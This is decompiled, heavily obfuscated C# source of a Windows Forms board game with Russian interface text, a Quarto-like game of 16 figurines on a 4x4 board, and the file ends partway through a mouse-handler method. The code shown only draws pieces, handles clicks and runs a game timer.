using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			Dark = dark;
			Big = big;
			Square = square;
			Point = point;
		}

		public Figurine(Figurine copy)
		{
			Dark = copy.Dark;
			Big = copy.Big;
			Square = copy.Square;
			Point = copy.Point;
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		bool flag = default(bool);
		int num4 = default(int);
		int num3 = default(int);
		double num9 = default(double);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -1303247440;
			while (true)
			{
				uint num2;
				double num10;
				PictureBox[,] array2;
				int num13;
				int num14;
				PictureBox obj2;
				switch ((num2 = (uint)num ^ 0xCDD017A5u) % 21u)
				{
				case 20u:
					flag = num4 < 4;
					num = -368003001;
					continue;
				case 19u:
					Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
					num = (int)(num2 * 581808143) ^ -1479961085;
					continue;
				case 18u:
					Form1.smethod_11((Control)(object)menu);
					num = (int)((num2 * 854388101) ^ 0x2C10A0DA);
					continue;
				case 17u:
				{
					Form3 form_ = new Form3();
					Form1.smethod_10((Form)(object)form_, (Form)(object)this);
					menu = (Form)(object)form_;
					num = ((int)num2 * -1743666669) ^ 0x61475973;
					continue;
				}
				case 16u:
					num = (int)((num2 * 861014250) ^ 0x1090E925);
					continue;
				case 15u:
				{
					Form1.smethod_6((Control)(object)pictureBox[num3, num4], new MouseEventHandler(PictureBoxIJ_MouseDown));
					PictureBox[,] array = borderBox;
					int num7 = num3;
					int num8 = num4;
					PictureBox obj = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj, new Size(size - 2, size - 2));
					Form1.smethod_4((Control)(object)obj, new Point(1 + (int)(((double)num4 + num9) * (double)size), 1 + num3 * size));
					Form1.smethod_7((Control)(object)obj, bool_0: false);
					array[num7, num8] = obj;
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[num3, num4]);
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[num3, num4]);
					num = (int)((num2 * 515153709) ^ 0x3A5FEE41);
					continue;
				}
				case 14u:
					num4 = 0;
					num = -519967865;
					continue;
				case 13u:
					InitializeComponent();
					num = (int)((num2 * 2022156250) ^ 0x6A0950E2);
					continue;
				case 12u:
					if (num4 >= 2)
					{
						num = (int)((num2 * 503112457) ^ 0x6A507A83);
						continue;
					}
					num10 = 0.0;
					goto IL_01b1;
				case 11u:
					num = (int)(num2 * 1994780020) ^ -1704453916;
					continue;
				case 10u:
					pictureBox = new PictureBox[4, 4];
					num = ((int)num2 * -1211738317) ^ 0x5BA8B3E1;
					continue;
				case 9u:
					flag2 = num3 < 4;
					num = -1751889820;
					continue;
				case 8u:
				{
					int num11;
					int num12;
					if (flag2)
					{
						num11 = -1469125898;
						num12 = -1469125898;
					}
					else
					{
						num11 = -1053802178;
						num12 = -1053802178;
					}
					num = num11 ^ (int)(num2 * 196038864);
					continue;
				}
				case 7u:
					num = -1797702669;
					continue;
				case 6u:
					num10 = 4.1;
					goto IL_01b1;
				case 5u:
				{
					int num5;
					int num6;
					if (flag)
					{
						num5 = -1679852567;
						num6 = -1679852567;
					}
					else
					{
						num5 = -987828213;
						num6 = -987828213;
					}
					num = num5 ^ ((int)num2 * -328877358);
					continue;
				}
				case 4u:
					borderBox = new PictureBox[4, 4];
					num3 = 0;
					num = (int)(num2 * 2091187400) ^ -1066691602;
					continue;
				case 2u:
					num4++;
					num = (int)((num2 * 998458928) ^ 0x3B8F1B87);
					continue;
				case 1u:
					num3++;
					num = ((int)num2 * -1734071310) ^ 0x55B47EC2;
					continue;
				default:
					return;
				case 0u:
					break;
				case 3u:
					return;
					IL_01b1:
					num9 = num10;
					array2 = pictureBox;
					num13 = num3;
					num14 = num4;
					obj2 = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj2, new Size(size - 8, size - 8));
					Form1.smethod_4((Control)(object)obj2, new Point(4 + (int)(((double)num4 + num9) * (double)size), 4 + num3 * size));
					Form1.smethod_5((Control)(object)obj2, Color.White);
					array2[num13, num14] = obj2;
					num = -1804059247;
					continue;
				}
				break;
			}
		}
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
		while (true)
		{
			int num = -1867242532;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x94306388u) % 3u)
				{
				case 2u:
					goto IL_000d;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_000d:
				num = (int)(num2 * 70351801) ^ -766535333;
			}
		}
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		Form1.smethod_15(timer1);
		bool flag = default(bool);
		while (true)
		{
			int num = 254922230;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x182BE900u) % 8u)
				{
				case 7u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 2116006381;
						num4 = 2116006381;
					}
					else
					{
						num3 = 481360761;
						num4 = 481360761;
					}
					num = num3 ^ (int)(num2 * 476398628);
					continue;
				}
				case 6u:
					num = ((int)num2 * -1426070192) ^ -1411732645;
					continue;
				case 5u:
					Form1.smethod_14(menu);
					num = (int)(num2 * 143618978) ^ -364509040;
					continue;
				case 3u:
					flag = Form1.smethod_16((Control)(object)menu) < 296;
					num = 605584359;
					continue;
				case 1u:
					num = 1235709344;
					continue;
				case 0u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = ((int)num2 * -23197928) ^ 0x7413FEBB;
					continue;
				}
				default:
					return;
				case 4u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		board = new Figurine[4, 4];
		int num3 = default(int);
		int num6 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = 1055113392;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xE427BE4u) % 19u)
				{
				case 18u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -947460596) ^ -2035447552;
					continue;
				case 17u:
					num3 = 0;
					num = 135420559;
					continue;
				case 16u:
					num6++;
					num = (int)(num2 * 30738330) ^ -567030683;
					continue;
				case 15u:
					num = 1935879984;
					continue;
				case 14u:
				{
					int num7;
					if (num6 >= 4)
					{
						num = 2108716799;
						num7 = 2108716799;
					}
					else
					{
						num = 10354301;
						num7 = 10354301;
					}
					continue;
				}
				case 13u:
					storage[num6, num3] = new Figurine(num6 < 2, num3 % 2 == 0, num3 < 2, num6 % 2 == 1);
					Form1.smethod_5((Control)(object)borderBox[num6, num3], Color.White);
					num = ((int)num2 * -1348534715) ^ 0x1E55CEA8;
					continue;
				case 12u:
					Paint_Board();
					num = (int)((num2 * 340668961) ^ 0x78C62AA1);
					continue;
				case 10u:
					flag = num3 < 4;
					num = 1337292170;
					continue;
				case 9u:
					num6 = 0;
					num = (int)(num2 * 1070645134) ^ -1626651431;
					continue;
				case 8u:
					Form1.smethod_7((Control)(object)pictureBox[num6, num3], bool_0: false);
					num = (int)((num2 * 658991503) ^ 0x7EF10422);
					continue;
				case 7u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = -296436792;
						num5 = -296436792;
					}
					else
					{
						num4 = -1899062392;
						num5 = -1899062392;
					}
					num = num4 ^ ((int)num2 * -315281440);
					continue;
				}
				case 6u:
					Paint_Storage();
					num = ((int)num2 * -417227085) ^ -1274449432;
					continue;
				case 5u:
					num = (int)(num2 * 435697002) ^ -1599121269;
					continue;
				case 4u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)((num2 * 459134619) ^ 0x6A4A8E29);
					continue;
				case 3u:
					num = (int)(num2 * 1044355264) ^ -1429841301;
					continue;
				case 1u:
					storage = new Figurine[4, 4];
					num = ((int)num2 * -2077212862) ^ -1171764773;
					continue;
				case 0u:
					num3++;
					num = (int)(num2 * 2118709563) ^ -643363470;
					continue;
				default:
					return;
				case 11u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		float num9 = default(float);
		float num8 = default(float);
		bool flag2 = default(bool);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num7 = default(float);
		int num3 = default(int);
		int num6 = default(int);
		float num5 = default(float);
		float num4 = default(float);
		bool dark = default(bool);
		bool flag = default(bool);
		bool square = default(bool);
		while (true)
		{
			int num = -652109311;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x80925D37u) % 40u)
				{
				case 39u:
					num = (int)((num2 * 1614293910) ^ 0xCA9A852);
					continue;
				case 38u:
					num9 = 1f - num8 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -901310;
					continue;
				case 37u:
					num = (int)(num2 * 34807754) ^ -614451733;
					continue;
				case 36u:
				{
					int num20;
					int num21;
					if (!flag2)
					{
						num20 = 495191898;
						num21 = 495191898;
					}
					else
					{
						num20 = 1773375331;
						num21 = 1773375331;
					}
					num = num20 ^ ((int)num2 * -1386993509);
					continue;
				}
				case 35u:
					num8 = 0.7f;
					num = -1269970493;
					continue;
				case 34u:
					Form1.smethod_28(graphics_, brush_, num7 + (float)(num3 * size), num7 + (float)(num6 * size), num5, num5);
					num = (int)((num2 * 280710763) ^ 0x623CEAAF);
					continue;
				case 33u:
					num6 = 0;
					num = (int)((num2 * 408992330) ^ 0x51C2B639);
					continue;
				case 32u:
					num = (int)((num2 * 1592670505) ^ 0x553FA192);
					continue;
				case 31u:
					num4 = (float)size * num8;
					num7 = (float)size * (num9 / 2f);
					num = ((int)num2 * -1154842833) ^ -1548759636;
					continue;
				case 30u:
					brush_ = Form1.smethod_26();
					num = -1173642601;
					continue;
				case 29u:
					dark = board[num6, num3].Dark;
					num = ((int)num2 * -1996635836) ^ 0x6585C508;
					continue;
				case 28u:
				{
					int num12;
					if (num6 >= 4)
					{
						num = -179119345;
						num12 = -179119345;
					}
					else
					{
						num = -877487890;
						num12 = -877487890;
					}
					continue;
				}
				case 27u:
				{
					int num18;
					int num19;
					if (dark)
					{
						num18 = 1411516045;
						num19 = 1411516045;
					}
					else
					{
						num18 = 284761040;
						num19 = 284761040;
					}
					num = num18 ^ (int)(num2 * 334874915);
					continue;
				}
				case 26u:
					num = (int)(num2 * 420115654) ^ -1751564813;
					continue;
				case 25u:
					num = ((int)num2 * -948001745) ^ 0x274F9E9C;
					continue;
				case 24u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1264468946) ^ -75044849;
					continue;
				case 23u:
					num = ((int)num2 * -2068346584) ^ 0x7911C40F;
					continue;
				case 22u:
				{
					int num16;
					int num17;
					if (flag)
					{
						num16 = 540908452;
						num17 = 540908452;
					}
					else
					{
						num16 = 1572835732;
						num17 = 1572835732;
					}
					num = num16 ^ (int)(num2 * 1943574281);
					continue;
				}
				case 21u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num3 + 0.05f) * (float)size, ((float)num6 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = -1832576080;
					continue;
				case 20u:
				{
					int num14;
					int num15;
					if (!square)
					{
						num14 = -1828304061;
						num15 = -1828304061;
					}
					else
					{
						num14 = -2095492355;
						num15 = -2095492355;
					}
					num = num14 ^ (int)(num2 * 1539293708);
					continue;
				}
				case 19u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)(num2 * 1666766013) ^ -1665205095;
					continue;
				case 18u:
					num8 = 1f;
					num = ((int)num2 * -308738903) ^ -1209108908;
					continue;
				case 17u:
					flag2 = board[num6, num3] != null;
					num = (int)((num2 * 1954455063) ^ 0x4D05DE34);
					continue;
				case 16u:
				{
					int num13;
					if (!board[num6, num3].Big)
					{
						num = -114197612;
						num13 = -114197612;
					}
					else
					{
						num = -1682703019;
						num13 = -1682703019;
					}
					continue;
				}
				case 15u:
					num = ((int)num2 * -1046945482) ^ -1935745292;
					continue;
				case 14u:
					num = (int)((num2 * 791914981) ^ 0x4DC649C7);
					continue;
				case 13u:
				{
					num7 = (float)size * (num9 / 2f);
					num5 = num4 * 0.4f / (float)Form1.smethod_27(2.0);
					int num10;
					int num11;
					if (!board[num6, num3].Point)
					{
						num10 = -855170726;
						num11 = -855170726;
					}
					else
					{
						num10 = -340219168;
						num11 = -340219168;
					}
					num = num10 ^ (int)(num2 * 1054689889);
					continue;
				}
				case 12u:
					num9 = 1f - num8 * 0.9f / (float)Form1.smethod_27(2.0);
					num = -214802136;
					continue;
				case 11u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -598596996) ^ 0x6844F6B4;
					continue;
				case 10u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num7 + (float)(num3 * size), num7 + (float)(num6 * size), num5, num5);
					num = (int)((num2 * 27338858) ^ 0x7DCA9609);
					continue;
				case 9u:
					num3++;
					num = -1037118584;
					continue;
				case 7u:
					flag = num3 < 4;
					num = -36336663;
					continue;
				case 6u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = (int)((num2 * 569291953) ^ 0x4D256862);
					continue;
				case 5u:
					num6++;
					num = ((int)num2 * -626554544) ^ -34338029;
					continue;
				case 4u:
					Form1.smethod_24(graphics_, brush_, num7 + (float)(num3 * size), num7 + (float)(num6 * size), num5, num5);
					num = -542263502;
					continue;
				case 2u:
					num5 = num4 * 0.9f / (float)Form1.smethod_27(2.0);
					square = board[num6, num3].Square;
					num = (int)((num2 * 57980635) ^ 0x3E95E9F5);
					continue;
				case 1u:
					num3 = 0;
					num = -1244292848;
					continue;
				case 0u:
					num = -666638802;
					continue;
				default:
					return;
				case 3u:
					break;
				case 8u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num = 0;
		float num4 = default(float);
		float num17 = default(float);
		float num5 = default(float);
		float num14 = default(float);
		bool point = default(bool);
		int num10 = default(int);
		Graphics graphics_ = default(Graphics);
		bool dark = default(bool);
		float num13 = default(float);
		Brush brush_ = default(Brush);
		bool flag4 = default(bool);
		bool flag3 = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			bool flag = num < 4;
			int num2 = -681643652;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0x82C51DB9u) % 36u)
				{
				case 35u:
					num2 = (int)(num3 * 965394700) ^ -1753260166;
					continue;
				case 34u:
					num4 = (float)size * (num17 / 2f) - 4f;
					num5 = num14 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num3 * -1482415240) ^ -1067356381;
					continue;
				case 33u:
				{
					int num15;
					int num16;
					if (point)
					{
						num15 = 1778890710;
						num16 = 1778890710;
					}
					else
					{
						num15 = 438814972;
						num16 = 438814972;
					}
					num2 = num15 ^ (int)(num3 * 1933088718);
					continue;
				}
				case 32u:
					Form1.smethod_20(pictureBox[num, num10], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num, num10]), Form1.smethod_16((Control)(object)pictureBox[num, num10])));
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num, num10]));
					dark = storage[num, num10].Dark;
					num2 = (int)(num3 * 2018273121) ^ -160539853;
					continue;
				case 31u:
					num13 = 1f;
					num2 = ((int)num3 * -1693253115) ^ -482820422;
					continue;
				case 30u:
				{
					int num22;
					if (storage[num, num10].Big)
					{
						num2 = -701632742;
						num22 = -701632742;
					}
					else
					{
						num2 = -1959762133;
						num22 = -1959762133;
					}
					continue;
				}
				case 29u:
					num5 = num14 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = ((int)num3 * -745480460) ^ 0x5C351481;
					continue;
				case 28u:
					brush_ = Form1.smethod_26();
					num2 = -1960600957;
					continue;
				case 27u:
					num2 = ((int)num3 * -511409728) ^ 0x3E1A970D;
					continue;
				case 26u:
					num14 = (float)size * num13;
					num2 = ((int)num3 * -54423498) ^ 0x65936067;
					continue;
				case 25u:
				{
					int num8;
					int num9;
					if (!flag)
					{
						num8 = -1090791924;
						num9 = -1090791924;
					}
					else
					{
						num8 = -1636904193;
						num9 = -1636904193;
					}
					num2 = num8 ^ (int)(num3 * 1261400566);
					continue;
				}
				case 24u:
					point = storage[num, num10].Point;
					num2 = (int)(num3 * 1813829449) ^ -960638156;
					continue;
				case 23u:
					Form1.smethod_28(graphics_, brush_, num4, num4, num5, num5);
					num2 = ((int)num3 * -586355382) ^ 0x2EA2350;
					continue;
				case 22u:
					num++;
					num2 = (int)(num3 * 1835284023) ^ -1472543546;
					continue;
				case 21u:
					num2 = -655513423;
					continue;
				case 20u:
					num17 = 1f - num13 * 0.9f / (float)Form1.smethod_27(2.0);
					num2 = -420326693;
					continue;
				case 18u:
					num13 = 0.7f;
					num2 = -827081323;
					continue;
				case 17u:
					num2 = ((int)num3 * -1589190818) ^ 0x4B26241B;
					continue;
				case 16u:
					Form1.smethod_24(graphics_, brush_, num4, num4, num5, num5);
					num2 = -1208109838;
					continue;
				case 15u:
				{
					int num20;
					int num21;
					if (flag4)
					{
						num20 = 1794060792;
						num21 = 1794060792;
					}
					else
					{
						num20 = 1808485903;
						num21 = 1808485903;
					}
					num2 = num20 ^ ((int)num3 * -1296828314);
					continue;
				}
				case 14u:
					flag4 = num10 < 2;
					num2 = ((int)num3 * -141651789) ^ -1049816256;
					continue;
				case 13u:
					num2 = ((int)num3 * -1009475948) ^ -1139259174;
					continue;
				case 12u:
					num10++;
					num2 = -1963046946;
					continue;
				case 11u:
					flag3 = num10 < 4;
					num2 = -295081099;
					continue;
				case 10u:
					flag2 = storage[num, num10] != null;
					num2 = -598253077;
					continue;
				case 8u:
				{
					int num18;
					int num19;
					if (flag3)
					{
						num18 = -975852273;
						num19 = -975852273;
					}
					else
					{
						num18 = -2134133001;
						num19 = -2134133001;
					}
					num2 = num18 ^ ((int)num3 * -540418149);
					continue;
				}
				case 7u:
					num17 = 1f - num13 * 0.4f / (float)Form1.smethod_27(2.0);
					num4 = (float)size * (num17 / 2f) - 4f;
					num2 = -1346497016;
					continue;
				case 6u:
				{
					int num11;
					int num12;
					if (!dark)
					{
						num11 = 255563459;
						num12 = 255563459;
					}
					else
					{
						num11 = 747883390;
						num12 = 747883390;
					}
					num2 = num11 ^ (int)(num3 * 1264871991);
					continue;
				}
				case 5u:
					brush_ = Form1.smethod_25();
					num2 = (int)((num3 * 33381225) ^ 0x56CEC75E);
					continue;
				case 4u:
					num10 = 0;
					num2 = -1305572012;
					continue;
				case 3u:
					Form1.smethod_30((Control)(object)pictureBox[num, num10]);
					num2 = -1850248544;
					continue;
				case 2u:
				{
					int num6;
					int num7;
					if (flag2)
					{
						num6 = -711589176;
						num7 = -711589176;
					}
					else
					{
						num6 = -1726002137;
						num7 = -1726002137;
					}
					num2 = num6 ^ (int)(num3 * 929964787);
					continue;
				}
				case 1u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num4, num4, num5, num5);
					num2 = (int)((num3 * 1182324767) ^ 0x187ED94D);
					continue;
				case 0u:
					num2 = ((int)num3 * -1236133998) ^ 0x6392C029;
					continue;
				default:
					return;
				case 9u:
					break;
				case 19u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		Form1_Load(this, Form1.smethod_31());
		bool flag2 = default(bool);
		int num5 = default(int);
		int num6 = default(int);
		int num4 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = 1839581133;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x74D5CE67u) % 32u)
				{
				case 31u:
					num = (int)(num2 * 1655777015) ^ -1048200934;
					continue;
				case 30u:
					num = ((int)num2 * -1689893697) ^ 0x614E5389;
					continue;
				case 29u:
					flag2 = num5 < 4;
					num = 1138606441;
					continue;
				case 28u:
					num = ((int)num2 * -770410051) ^ 0x673E3CAA;
					continue;
				case 27u:
				{
					int num9;
					if (num6 >= 4)
					{
						num = 744916616;
						num9 = 744916616;
					}
					else
					{
						num = 448624338;
						num9 = 448624338;
					}
					continue;
				}
				case 26u:
					num4 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 1876076397) ^ -1190203017;
					continue;
				case 25u:
					step = 0;
					num = ((int)num2 * -1835099950) ^ 0x60AAEBE8;
					continue;
				case 24u:
				{
					int num10;
					int num11;
					if (flag)
					{
						num10 = 257310721;
						num11 = 257310721;
					}
					else
					{
						num10 = 35494766;
						num11 = 35494766;
					}
					num = num10 ^ ((int)num2 * -1668371891);
					continue;
				}
				case 23u:
					Form1.smethod_7((Control)(object)pictureBox[num6, num5], bool_0: true);
					num = 2044957230;
					continue;
				case 22u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					Form1.smethod_35(timer1, bool_0: true);
					num = (int)(num2 * 75594252) ^ -757712279;
					continue;
				case 21u:
					num5 = 0;
					num = 1449608698;
					continue;
				case 20u:
					step = 1;
					num = ((int)num2 * -724977683) ^ 0x4B06D450;
					continue;
				case 19u:
					num = (int)(num2 * 2067471467) ^ -110533422;
					continue;
				case 18u:
					num6++;
					num = (int)(num2 * 1079587440) ^ -1988658724;
					continue;
				case 17u:
					num = 1147511485;
					continue;
				case 16u:
					num = (int)((num2 * 1060162960) ^ 0x304D0AA3);
					continue;
				case 15u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = (int)(num2 * 368016212) ^ -1084629134;
					continue;
				case 14u:
				{
					int num7;
					int num8;
					if (flag2)
					{
						num7 = -1247794452;
						num8 = -1247794452;
					}
					else
					{
						num7 = -705794839;
						num8 = -705794839;
					}
					num = num7 ^ ((int)num2 * -310174);
					continue;
				}
				case 13u:
					num = ((int)num2 * -1560186218) ^ 0x7EB01029;
					continue;
				case 12u:
					num6 = 0;
					num = ((int)num2 * -960447341) ^ 0x37C36C38;
					continue;
				case 10u:
					flag = turn;
					num = ((int)num2 * -1896894219) ^ -160028371;
					continue;
				case 9u:
					num = ((int)num2 * -464463308) ^ -360936268;
					continue;
				case 8u:
					num = ((int)num2 * -960686948) ^ -1482511742;
					continue;
				case 7u:
					num5++;
					num = ((int)num2 * -1179455303) ^ 0x38F72AF5;
					continue;
				case 6u:
					Form1.smethod_36(timer1);
					num = ((int)num2 * -2120251140) ^ -1645682329;
					continue;
				case 4u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = 2002019345;
					continue;
				case 3u:
					num = (int)((num2 * 2133754353) ^ 0x1198894);
					continue;
				case 2u:
				{
					int num3 = Form1.smethod_33(rnd, 4);
					Form1.smethod_5((Control)(object)borderBox[num4, num3], Color.Blue);
					num = ((int)num2 * -1541628218) ^ 0x62D2D808;
					continue;
				}
				case 1u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = (int)((num2 * 1767531701) ^ 0x1EF26E6D);
					continue;
				case 0u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 111990922) ^ -112725541;
					continue;
				default:
					return;
				case 11u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		time = time.AddSeconds(1.0);
		Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_022b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0241: Expected O, but got Unknown
		Point point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
		bool flag = default(bool);
		int num10 = default(int);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		int num5 = default(int);
		int num6 = default(int);
		int num8 = default(int);
		while (true)
		{
			int num = 607329794;
			while (true)
			{
				uint num2;
				int num7;
				switch ((num2 = (uint)num ^ 0x47159FC2u) % 21u)
				{
				case 20u:
					num = ((int)num2 * -1510043569) ^ 0x187A8DB1;
					continue;
				case 19u:
					flag = num10 < 4;
					num = 1063556574;
					continue;
				case 18u:
					num = ((int)num2 * -48837873) ^ 0x796B5692;
					continue;
				case 17u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)(num2 * 483065463) ^ -1129210348;
					continue;
				case 16u:
				{
					int num11;
					int num12;
					if (!flag2)
					{
						num11 = -257855338;
						num12 = -257855338;
					}
					else
					{
						num11 = -448245475;
						num12 = -448245475;
					}
					num = num11 ^ ((int)num2 * -748334227);
					continue;
				}
				case 15u:
					num10 = 0;
					num = (int)((num2 * 1943008254) ^ 0x6D9FE024);
					continue;
				case 14u:
					num10++;
					num = ((int)num2 * -1760536053) ^ -1101454677;
					continue;
				case 13u:
				{
					int num13;
					int num14;
					if (flag3)
					{
						num13 = -112620567;
						num14 = -112620567;
					}
					else
					{
						num13 = -170235032;
						num14 = -170235032;
					}
					num = num13 ^ (int)(num2 * 495921162);
					continue;
				}
				case 12u:
					num = ((int)num2 * -2047126661) ^ 0x1B3B1769;
					continue;
				case 11u:
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.Red);
					num = ((int)num2 * -944997089) ^ -1224071312;
					continue;
				case 10u:
					num6 -= 4;
					num = (int)((num2 * 31376398) ^ 0x2480DA44);
					continue;
				case 9u:
					num = (int)(num2 * 453891013) ^ -758014609;
					continue;
				case 8u:
					num5 = point.Y / size;
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num6 = point.X / size;
					flag3 = num6 > 1;
					num = (int)(num2 * 1309031510) ^ -1637690201;
					continue;
				case 7u:
					if (storage[num5, num6] != null)
					{
						num = 1803735553;
						continue;
					}
					num7 = 0;
					goto IL_01ba;
				case 5u:
					Form1.smethod_5((Control)(object)borderBox[num10, num8], Color.White);
					num8++;
					num = 1738147789;
					continue;
				case 4u:
					num8 = 0;
					num = 401129464;
					continue;
				case 3u:
				{
					int num9;
					if (num8 >= 4)
					{
						num = 1242753739;
						num9 = 1242753739;
					}
					else
					{
						num = 1427988559;
						num9 = 1427988559;
					}
					continue;
				}
				case 2u:
					num7 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num5, num6]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_01ba;
				case 1u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -1081356127;
						num4 = -1081356127;
					}
					else
					{
						num3 = -1369476494;
						num4 = -1369476494;
					}
					num = num3 ^ ((int)num2 * -393197205);
					continue;
				}
				default:
					return;
				case 0u:
					break;
				case 6u:
					return;
					IL_01ba:
					flag2 = (byte)num7 != 0;
					num = 1654796747;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		int num = Form1.smethod_38(e) / size;
		Graphics graphics_ = default(Graphics);
		bool flag3 = default(bool);
		int num5 = default(int);
		int num4 = default(int);
		bool flag2 = default(bool);
		int num8 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num2 = -2048942491;
			while (true)
			{
				uint num3;
				int num9;
				switch ((num3 = (uint)num2 ^ 0xA7541D1Bu) % 30u)
				{
				case 29u:
					num2 = (int)(num3 * 1252487712) ^ -994694249;
					continue;
				case 27u:
					Form1.smethod_45(graphics_);
					Form1.smethod_30((Control)(object)pictureBox1);
					num2 = ((int)num3 * -1110515452) ^ 0x1075E120;
					continue;
				case 26u:
					num2 = ((int)num3 * -1067449077) ^ -404696467;
					continue;
				case 25u:
					flag3 = num5 < 4;
					num2 = -745106135;
					continue;
				case 24u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num2 = (int)(num3 * 54895739) ^ -1582097850;
						continue;
					}
					goto IL_00b6;
				case 23u:
					num2 = ((int)num3 * -141657108) ^ -638432053;
					continue;
				case 22u:
					num4++;
					num2 = ((int)num3 * -812142697) ^ 0x74AD5525;
					continue;
				case 21u:
					num2 = (int)(num3 * 1424007358) ^ -1450432170;
					continue;
				case 20u:
					flag2 = num4 < 4;
					num2 = -1620417880;
					continue;
				case 19u:
				{
					int num12;
					int num13;
					if (flag2)
					{
						num12 = 1061604899;
						num13 = 1061604899;
					}
					else
					{
						num12 = 596024766;
						num13 = 596024766;
					}
					num2 = num12 ^ ((int)num3 * -1053840673);
					continue;
				}
				case 18u:
